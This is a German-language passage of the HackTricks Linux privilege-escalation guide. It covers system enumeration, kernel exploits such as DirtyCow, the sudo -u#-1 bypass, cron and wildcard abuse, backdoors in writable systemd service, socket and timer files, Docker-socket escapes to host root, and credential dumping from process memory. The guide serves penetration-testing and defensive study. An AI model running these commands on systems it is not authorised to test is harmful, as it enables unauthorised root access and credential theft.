# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Systeminformationen

### OS-Info

Beginnen wir damit, Informationen über das laufende OS zu sammeln.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

Wenn du **Schreibrechte auf einen Ordner im `PATH`** hast, kannst du möglicherweise einige libraries oder binaries hijacken:
```bash
echo $PATH
```
### Env info

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Überprüfe die Kernel-Version und ob es einen Exploit gibt, mit dem Privilegien eskaliert werden können
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Eine gute Liste verwundbarer Kernel und einige bereits **compiled exploits** findest du hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Weitere Seiten, auf denen du einige **compiled exploits** finden kannst: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Webseite zu extrahieren, kannst du folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach kernel exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, prüft nur exploits für kernel 2.x)

Suche immer **die Kernel-Version in Google**, vielleicht ist deine Kernel-Version in einem kernel exploit erwähnt und dann bist du sicher, dass dieser exploit gültig ist.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Basierend auf den anfälligen Sudo-Versionen, die in Folgendem aufgelistet sind:
```bash
searchsploit sudo
```
Du kannst prüfen, ob die sudo-Version anfällig ist, indem du dieses grep verwendest.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg Signaturprüfung fehlgeschlagen

Siehe **smasher2 box of HTB** für ein **Beispiel**, wie diese vuln ausgenutzt werden kann.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere System-Enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Abwehrmaßnahmen auflisten

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Wenn du dich in einem docker container befindest, kannst du versuchen, daraus zu entkommen:

{{#ref}}
docker-security/
{{#endref}}

## Laufwerke

Prüfe **what is mounted and unmounted**, wo und warum. Wenn etwas unmounted ist, könntest du versuchen, es zu mounten und nach privaten Daten zu suchen.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Nützliche binaries auflisten
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Prüfe auch, ob **ein Compiler installiert ist**. Das ist nützlich, wenn du einen kernel exploit verwenden musst, da empfohlen wird, ihn auf der Maschine zu kompilieren, auf der du ihn einsetzen willst (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Verwundbare installierte Software

Prüfe die **Version der installierten Pakete und Dienste**. Vielleicht gibt es eine alte Nagios-Version (zum Beispiel), die ausgenutzt werden könnte, um escalating privileges zu erreichen…\
Es wird empfohlen, die Version der verdächtigeren installierten Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Beachte, dass diese Befehle viele Informationen anzeigen, die größtenteils nutzlos sein werden, daher empfiehlt es sich, Anwendungen wie OpenVAS oder ähnliche zu verwenden, die prüfen, ob eine installierte Softwareversion gegenüber bekannten Exploits verwundbar ist_

## Prozesse

Sieh dir an, **welche Prozesse** ausgeführt werden, und prüfe, ob ein Prozess **mehr Rechte hat, als er haben sollte** (vielleicht läuft ein tomcat als root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Prozessüberwachung

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Das kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn bestimmte Bedingungen erfüllt sind.

### Prozessspeicher

Einige Dienste auf einem Server speichern **Zugangsdaten im Klartext im Speicher**.\
Normalerweise benötigst du **root privileges**, um den Speicher von Prozessen zu lesen, die anderen Nutzern gehören; daher ist das meist nützlicher, wenn du bereits root bist und weitere Zugangsdaten entdecken möchtest.\
Denke jedoch daran, dass **du als normaler Benutzer den Speicher der Prozesse lesen kannst, die dir gehören**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle Prozesse können debuggt werden, solange sie die gleiche uid haben. Das ist die klassische Arbeitsweise von ptrace.
> - **kernel.yama.ptrace_scope = 1**: nur ein Parent-Prozess kann debuggt werden.
> - **kernel.yama.ptrace_scope = 2**: Nur Admin kann ptrace benutzen, da dafür die Capability CAP_SYS_PTRACE erforderlich ist.
> - **kernel.yama.ptrace_scope = 3**: Keine Prozesse dürfen mit ptrace getraced werden. Nach dem Setzen ist ein Reboot nötig, um ptrace wieder zu ermöglichen.

#### GDB

Wenn du Zugriff auf den Speicher eines FTP-Services (zum Beispiel) hast, könntest du den Heap extrahieren und darin nach seinen Zugangsdaten suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB-Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID, **maps zeigen, wie der Speicher innerhalb dieses Prozesses abgebildet ist** im virtuellen Adressraum; sie zeigen auch die **Berechtigungen jeder abgebildeten Region**. Die **mem** Pseudo-Datei **legt den Speicher des Prozesses selbst offen**. Aus der **maps** Datei wissen wir, welche **Speicherbereiche lesbar sind** und ihre Offsets. Wir nutzen diese Informationen, um **in die mem Datei zu seeken und alle lesbaren Regionen zu dumpen** in eine Datei.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bietet Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Der virtuelle Adressraum des Kernels kann über /dev/kmem angesprochen werden.\
Typischerweise ist `/dev/mem` nur für **root** und die Gruppe **kmem** lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für Linux

ProcDump ist eine für Linux neu interpretierte Version des klassischen ProcDump-Tools aus der Sysinternals-Tool-Suite für Windows. Erhältlich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Werkzeuge

Um den Speicher eines Prozesses zu dumpen, kannst du Folgendes verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Du kannst manuell die root-Anforderungen entfernen und den Prozess, der dir gehört, dumpen
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Zugangsdaten aus dem Prozessspeicher

#### Manuelles Beispiel

Wenn du feststellst, dass der authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den Prozess dumpen (siehe vorherige Abschnitte, um verschiedene Möglichkeiten zu finden, den memory eines Prozesses zu dumpen) und im memory nach credentials suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **Klartext-Anmeldedaten aus dem Speicher stehlen** und aus einigen **bekannten Dateien**. Es benötigt Root-Rechte, um richtig zu funktionieren.

| Funktion                                          | Prozessname          |
| ------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktive FTP-Verbindungen)                  | vsftpd               |
| Apache2 (aktive HTTP Basic-Auth-Sitzungen)        | apache2              |
| OpenSSH (aktive SSH-Sitzungen - Sudo Verwendung)  | sshd:                |

#### Such-Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron jobs

Überprüfe, ob ein geplanter Job verwundbar ist. Vielleicht kannst du ausnutzen, dass ein script von root ausgeführt wird (wildcard vuln? Kannst du Dateien ändern, die root verwendet? symlinks verwenden? Bestimmte Dateien in dem Verzeichnis erstellen, das root verwendet?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-Pfad

Zum Beispiel findest du in _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer "user" Schreibrechte auf /home/user hat_)

Wenn in diesem crontab der Benutzer root versucht, einen Befehl oder ein Script auszuführen, ohne den PATH zu setzen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kannst du eine root-Shell erhalten, indem du Folgendes ausführst:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Wenn ein script, das von root ausgeführt wird, ein “**\***” in einem Befehl enthält, kannst du dies ausnutzen, um unerwartete Dinge zu bewirken (z. B. privesc). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn das wildcard von einem Pfad wie** _**/some/path/\***_ **vorangestellt ist, ist es nicht verwundbar (auch** _**./\***_ **nicht).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron script Überschreiben und symlink

Wenn du **ein cron script ändern kannst**, das von root ausgeführt wird, kannst du sehr einfach eine shell bekommen:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das von root ausgeführte script ein **directory where you have full access** verwendet, kann es sinnvoll sein, diesen Ordner zu löschen und **create a symlink folder to another one**, das ein von Ihnen kontrolliertes script bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Häufige cron jobs

Du kannst die Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du das ausnutzen und Privilegien eskalieren.

Zum Beispiel, um **alle 0.1s für 1 Minute zu überwachen**, **nach am wenigsten ausgeführten Befehlen zu sortieren** und die Befehle zu löschen, die am häufigsten ausgeführt wurden, kannst du Folgendes tun:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Sie können auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **verwenden** (dies überwacht und listet jeden gestarteten Prozess).

### Unsichtbare cron jobs

Es ist möglich, einen cronjob zu erstellen, indem man **ein Carriage-Return-Zeichen nach einem Kommentar setzt** (ohne Zeilenumbruchzeichen), und der cron job wird funktionieren. Beispiel (achte auf das Carriage-Return-Zeichen):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Writable _.service_ files

Prüfe, ob du irgendeine `.service`-Datei schreiben kannst. Falls ja, könntest du sie so modifizieren, dass sie deine backdoor ausführt, wenn der service **gestartet**, **neu gestartet** oder **gestoppt** wird (möglicherweise musst du bis zum nächsten Reboot des Systems warten).\
Zum Beispiel erstelle deine backdoor in der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Beachte, dass du, wenn du **Schreibrechte auf binaries, die von services ausgeführt werden**, hast, diese ändern kannst, um backdoors einzubauen, sodass beim erneuten Ausführen der services die backdoors ausgeführt werden.

### systemd PATH - Relative Pfade

Du kannst den von **systemd** verwendeten PATH sehen mit:
```bash
systemctl show-environment
```
Wenn Sie feststellen, dass Sie in einem der Ordner des Pfads **schreiben** können, könnten Sie möglicherweise **Privilegien eskalieren**. Sie müssen nach **relativen Pfaden suchen, die in Service-Konfigurationsdateien verwendet werden**, wie zum Beispiel:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Erstelle dann eine **ausführbare Datei** mit genau demselben Namen wie die Binärdatei des relativen Pfads im systemd PATH-Ordner, den du beschreiben kannst, und wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird deine **backdoor** ausgeführt (nicht-privilegierte Benutzer können Services normalerweise nicht starten/stoppen, prüfe aber, ob du `sudo -l` verwenden kannst).

**Mehr über Services erfährst du mit `man systemd.service`.**

## **Timer**

**Timer** sind systemd Unit-Dateien, deren Name auf `**.timer**` endet und die `**.service**`-Dateien oder Ereignisse steuern. **Timer** können als Alternative zu cron verwendet werden, da sie eingebaute Unterstützung für kalenderbasierte Zeitereignisse und monotone Zeitereignisse bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Beschreibbare Timer

Wenn du einen Timer modifizieren kannst, kannst du ihn dazu bringen, vorhandene Units von systemd.unit auszuführen (wie eine `.service` oder eine `.target`)
```bash
Unit=backdoor.service
```
In der Dokumentation kannst du lesen, was die Unit ist:

> Die Unit, die aktiviert wird, wenn dieser timer abläuft. Das Argument ist ein Unit-Name, dessen Suffix nicht ".timer" ist. Wenn nicht angegeben, ist dieser Wert standardmäßig auf einen service gesetzt, der denselben Namen wie die timer unit trägt, abgesehen vom Suffix. (Siehe oben.) Es wird empfohlen, dass der Unit-Name, der aktiviert wird, und der Unit-Name der timer unit identisch benannt sind, abgesehen vom Suffix.

Daher müsstest du, um diese Berechtigung auszunutzen:

- Finde eine systemd Unit (wie eine `.service`), die **ein beschreibbares Binary ausführt**
- Finde eine systemd Unit, die **einen relativen Pfad ausführt** und bei der du **schreibbare Rechte** auf den **systemd PATH** hast (um dieses Executable zu imitieren)

**Mehr über Timer erfährst du mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, benötigst du root-Rechte und musst Folgendes ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) ermöglichen **Prozesskommunikation** auf demselben oder auf verschiedenen Rechnern innerhalb von Client-Server-Modellen. Sie nutzen Standard-Unix-Descriptor-Dateien für die inter-computer Kommunikation und werden über `.socket`-Dateien eingerichtet.

Sockets können mithilfe von `.socket`-Dateien konfiguriert werden.

**Learn more about sockets with `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, aber zusammenfassend werden sie verwendet, um **anzugeben, wo auf das Socket gehört werden soll** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6- und/oder Portnummer, auf die gehört werden soll, usw.).
- `Accept`: Nimmt ein boolesches Argument. Wenn **true**, wird für jede eingehende Verbindung eine **Service-Instanz gestartet** und nur das Verbindungssocket an diese weitergereicht. Wenn **false**, werden alle Listening-Sockets selbst an die gestartete Service-Unit **übergeben**, und es wird nur eine Service-Unit für alle Verbindungen gestartet. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, wo eine einzige Service-Unit bedingungslos allen eingehenden Verkehr behandelt. **Defaults to false**. Aus Performance-Gründen wird empfohlen, neue Daemons so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Kommandozeilen entgegen, die **ausgeführt werden bevor** bzw. **nachdem** die Listening-**sockets**/FIFOs **erstellt** und gebunden werden. Das erste Token der Kommandozeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **ausgeführt werden bevor** bzw. **nachdem** die Listening-**sockets**/FIFOs **geschlossen** und entfernt werden.
- `Service`: Gibt den Namen der **Service**-Unit an, die bei **eingehendem Traffic** **aktiviert** werden soll. Diese Einstellung ist nur für Sockets mit Accept=no erlaubt. Sie standardisiert auf den Service mit demselben Namen wie das Socket (mit ersetzter Suffix). In den meisten Fällen sollte es nicht notwendig sein, diese Option zu verwenden.

### Writable .socket files

Wenn du eine **writable** `.socket`-Datei findest, kannst du **am Anfang** des `[Socket]`-Abschnitts etwas wie `ExecStartPre=/home/kali/sys/backdoor` hinzufügen und die backdoor wird ausgeführt, bevor das Socket erstellt wird. Daher wirst du **wahrscheinlich warten müssen, bis die Maschine neu gestartet wird.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Wenn du **ein beschreibbares Socket** identifizierst (_hier sprechen wir jetzt von Unix Sockets und nicht von den Konfig-`.socket`-Dateien_), dann **kannst du mit diesem Socket kommunizieren** und möglicherweise eine Vulnerability exploit'en.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Beachte, dass es einige **sockets gibt, die auf HTTP-Anfragen lauschen** (_ich spreche nicht von .socket-Dateien, sondern von Dateien, die als unix sockets fungieren_). Du kannst das mit folgendem Befehl überprüfen:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Wenn der Socket **auf eine HTTP-Anfrage antwortet**, kannst du mit ihm **kommunizieren** und vielleicht **exploit some vulnerability**.

### Schreibbarer Docker Socket

Der Docker Socket, oft zu finden unter `/var/run/docker.sock`, ist eine kritische Datei, die gesichert werden sollte. Standardmäßig ist er für den Benutzer `root` und Mitglieder der `docker`-Gruppe schreibbar. Schreibzugriff auf diesen Socket kann zu Privilege Escalation führen. Im Folgenden eine Aufschlüsselung, wie das gemacht werden kann, sowie alternative Methoden, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation with Docker CLI**

Wenn du Schreibzugriff auf den Docker Socket hast, kannst du escalate privileges mit den folgenden Befehlen:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle erlauben es, einen Container mit root-Zugriff auf das Dateisystem des Hosts auszuführen.

#### **Direkte Verwendung der Docker API**

In Fällen, in denen die Docker CLI nicht verfügbar ist, kann der Docker-Socket weiterhin über die Docker API und `curl`-Befehle manipuliert werden.

1.  **List Docker Images:** Rufe die Liste der verfügbaren Images ab.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Sende eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Hosts einbindet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Starte den neu erstellten Container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Verwende `socat`, um eine Verbindung zum Container herzustellen und darin Befehle auszuführen.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nachdem die `socat`-Verbindung hergestellt ist, kannst du Befehle direkt im Container ausführen und hast dabei root-Zugriff auf das Dateisystem des Hosts.

### Weitere

Beachte, dass wenn du Schreibrechte auf dem docker-Socket hast, weil du **inside the group `docker`** bist, du [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Wenn die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising), kannst du diese ebenfalls kompromittieren.

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgefeiltes Interprozess-Kommunikationssystem (IPC), das Anwendungen ermöglicht, effizient zu interagieren und Daten auszutauschen. Für moderne Linux-Systeme konzipiert bietet es ein robustes Framework für verschiedene Formen der Anwendungs-Kommunikation.

Das System ist vielseitig einsetzbar: Es unterstützt grundlegende IPC, die den Datenaustausch zwischen Prozessen verbessert, ähnlich wie **enhanced UNIX domain sockets**. Außerdem unterstützt es das Broadcasten von Events oder Signalen und ermöglicht eine nahtlose Integration von Systemkomponenten. Beispielsweise kann ein Signal eines Bluetooth-Daemons über einen eingehenden Anruf einen Musikplayer stummschalten. Zusätzlich unterstützt D-Bus ein Remote-Object-System, das Service-Anfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und bisher komplexe Abläufe erleichtert.

D-Bus arbeitet nach einem **allow/deny model** und verwaltet Nachrichtenberechtigungen (Methodenaufrufe, Signal-Emissionen usw.) basierend auf dem kumulativen Effekt übereinstimmender Policy-Regeln. Diese Policies legen fest, welche Interaktionen mit dem Bus erlaubt sind und können potenziell zu privilege escalation führen, wenn diese Berechtigungen ausgenutzt werden.

Ein Beispiel für eine solche Policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird gezeigt und beschreibt Berechtigungen, die dem root-Benutzer erlauben, `fi.w1.wpa_supplicant1` zu besitzen, an es zu senden und Nachrichten von ihm zu empfangen.

Policies ohne angegebenen Benutzer oder Gruppe gelten universal, während "default" Kontext-Policies für alle gelten, die nicht durch andere spezifische Policies abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Erfahre hier, wie man eine D-Bus-Kommunikation enumeriert und ausnutzt:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu erkunden und die Position der Maschine zu bestimmen.

### Generische Enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Offene Ports

Überprüfe immer die auf dem System laufenden Netzwerkdienste, mit denen du vor dem Zugriff nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Prüfe, ob du traffic sniffen kannst. Wenn ja, könntest du einige credentials abgreifen.
```
timeout 1 tcpdump
```
## Benutzer

### Allgemeine Enumeration

Überprüfe **wer** du bist, welche **Privilegien** du hast, welche **Benutzer** sich im System befinden, welche sich **einloggen** können und welche **root-Privilegien** haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
